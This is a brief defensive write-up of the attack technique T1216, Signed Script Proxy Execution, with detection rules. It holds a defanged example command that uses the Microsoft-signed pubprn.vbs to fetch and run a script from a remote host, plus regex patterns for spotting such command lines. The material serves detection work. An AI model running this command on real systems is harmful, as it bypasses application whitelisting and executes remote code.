# T1216: Signed Script Proxy Execution

Scripts signed with trusted certificates can be used to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application whitelisting solutions that do not account for use of these scripts.

PubPrn.vbs is signed by Microsoft and can be used to proxy execution from a remote site. Example command: 
```cscript C[:]\Windows\System32\Printing_Admin_Scripts\en-US\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png```

There are several other signed scripts that may be used in a similar manner.

## Detection 
```
Sysmon Event ID = 1
Windows Security Event ID = 4688
process_command_line = ["cscript.*script\:http\[\:\]\/\/", "wscript.*script\:http\[\:\]\/\/", "certutil.*script\:http\[\:\]\/\/", "*jjs*-scripting*"]
```
